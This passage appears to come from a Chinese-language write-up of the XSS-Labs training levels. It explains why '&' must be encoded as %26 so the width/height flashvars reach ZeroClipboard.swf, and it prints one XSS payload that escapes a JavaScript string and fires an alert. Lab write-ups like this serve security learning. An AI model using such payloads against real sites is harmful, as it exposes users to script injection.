### Q2：本关如果不编码`&`会发生什么？
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937355819_u6w2k5.webp)

ZeroClipboard.swf 检测不到`width`、`height`flashvars，内部绘图逻辑直接拦截，**XSS 被不触发。**

  

所以需要将`&`编码一次变成`%26`，这里需要过两道解析：：PHP 先解析 URL → 把值塞进 embed 标签 → Flash 再解析 embed 里的 swf 地址。

```html
?arg01=id&arg02=\"))}catch(e){alert(/XSS/.source);}//%26width=500%26height=500
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937358436_0oscpd.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937360457_82ns2j.webp)

